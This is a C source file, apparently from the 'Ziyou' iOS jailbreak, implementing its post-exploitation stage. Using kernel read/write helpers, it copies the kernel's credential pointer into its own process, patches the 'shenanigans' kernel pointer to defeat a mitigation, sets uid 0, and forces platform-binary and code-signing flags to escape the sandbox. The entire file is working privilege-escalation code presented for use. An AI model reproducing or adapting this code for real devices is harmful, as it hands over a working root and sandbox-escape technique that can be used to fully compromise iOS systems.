//
//  shenanigans.c
//  Ziyou
//
//  Created by Tanay Findley on 7/12/19.
//  Copyright © 2019 Ziyou Team. All rights reserved.
//

#include "shenanigans.h"
#include "common.h"
#include "utilsZS.h"
#include "remap_tfp_set_hsp.h"
#include "PFOffs.h"
#include "KernelUtils.h"
#include "OffsetHolder.h"
#include <stdint.h>
#include <mach/mach_init.h>

//We should only use this for v_swap

bool set_platform_binary(kptr_t proc, bool set)
{
    bool ret = false;
    kptr_t const task_struct_addr = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    kptr_t const task_t_flags_addr = task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS);
    uint32_t task_t_flags = ReadKernel32(task_t_flags_addr);
    if (set) {
        task_t_flags |= 0x00000400;
    } else {
        task_t_flags &= ~(0x00000400);
    }
    WriteKernel32(task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS), task_t_flags);
    ret = true;
out:;
    return ret;
}

uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
{
    uint64_t orig_creds = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    util_info("orig_creds = " ADDR, orig_creds);
    if (!ISADDR(orig_creds)) {
        util_error("failed to get orig_creds!");
        return 0;
    }
    WriteKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), cred_addr);
    return orig_creds;
}

kptr_t get_kernel_proc_struct_addr() {
    kptr_t ret = KPTR_NULL;
    kptr_t const symbol = GETOFFSET(kernel_task);
    //util_info("kernel_task symbol = " ADDR, symbol);
    if (our_kernel_procStruct_exportAstylez != 0) {
        kptr_t const task = our_kernel_taskStruct_exportAstylez;//ReadKernel64(symbol);
        //util_info("task of symbol = " ADDR, task);
        kptr_t const bsd_info = our_kernel_procStruct_exportAstylez;//ReadKernel64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    //util_info("bsd_info of kernel_task is procofKern = " ADDR, bsd_info);
        ret = bsd_info;
    } else {
        kptr_t const task = ReadKernel64(symbol);
       // util_info("task of symbol = " ADDR, task);
        kptr_t const bsd_info = ReadKernel64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
       // util_info("bsd_info of kernel_task is procofKern = " ADDR, bsd_info);
        ret = bsd_info;
    }
out:;
    return ret;
}

kptr_t get_kernel_cred_addr()
{
    kptr_t ret = KPTR_NULL;
    kptr_t const kernel_proc_struct_addr = get_kernel_proc_struct_addr();
   // util_info("kernel_proc_struct_addr = " ADDR, kernel_proc_struct_addr);

    kptr_t const kernel_ucred_struct_addr = ReadKernel64(kernel_proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
   // util_info("kernel_ucred_struct_addr = " ADDR, kernel_ucred_struct_addr);
    ret = kernel_ucred_struct_addr;
out:;
    return ret;
}

bool set_csflags_fr(kptr_t proc, uint32_t flags, bool value) {
    bool ret = false;
    kptr_t const proc_csflags_addr = proc + koffset(KSTRUCT_OFFSET_PROC_P_CSFLAGS);
    uint32_t csflags = ReadKernel32(proc_csflags_addr);
    if (value == true) {
        csflags |= flags;
    } else {
        csflags &= ~flags;
    }
    WriteKernel32(proc_csflags_addr, csflags);
    ret = true;
out:;
    return ret;
}

bool set_cs_platform_binary(kptr_t proc, bool value) {
    bool ret = false;
    set_csflags_fr(proc, 0x4000000, value);
    ret = true;
out:;
    return ret;
}


void runShenPatch()
{
    static uint64_t ShenanigansPatch = 0xca13feba37be;
    
    uint64_t proc;
    uint64_t kernelCredAddr;
    uint64_t myCredAddr;
    uint64_t Shenanigans;
    host_t myHost;
    
    util_info("Escaping Sandbox...");
    
    proc = get_proc_struct_for_pid(getpid());
    kernelCredAddr = get_kernel_cred_addr();
    Shenanigans = ReadKernel64(GETOFFSET(shenanigans));//kernelCredAddr;//
    if (Shenanigans != kernelCredAddr) {
        util_info("Detected corrupted shenanigans pointer.");
        Shenanigans = kernelCredAddr;
    }
    WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
    uint64_t myOriginalCredAddr = myCredAddr = give_creds_to_process_at_addr(proc, kernelCredAddr);
    util_info("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
    
    setuid(0);
    
    if (getuid() != 0)
    {
        util_error("ERROR SETTING UID");
        exit(-1);
    }
    
    myHost = mach_host_self();
    set_platform_binary(proc, true);
    set_cs_platform_binary(proc, true);
    util_info("Successfully escaped Sandbox.");
}
